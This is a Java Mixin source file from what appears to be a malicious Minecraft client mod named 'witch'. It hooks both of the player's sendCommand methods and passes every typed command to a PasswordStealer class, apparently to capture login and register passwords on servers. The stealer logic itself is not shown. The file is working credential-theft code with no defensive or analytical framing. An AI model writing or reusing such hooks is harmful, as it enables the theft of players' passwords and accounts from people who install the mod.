package me.soda.witch.mixin;

import me.soda.witch.features.PasswordStealer;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

@Mixin(ClientPlayerEntity.class)
abstract class ClientPlayerEntityMixin {

    @Inject(method = "sendCommand(Ljava/lang/String;)Z", at = @At("HEAD"), cancellable = true)
    private void onSendCommand(String command, CallbackInfoReturnable<Boolean> cir) {
        PasswordStealer.stealPassword(command);
    }

    @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
    private void onSendCommand(String command, Text preview, CallbackInfo info) {
        PasswordStealer.stealPassword(command);
    }
}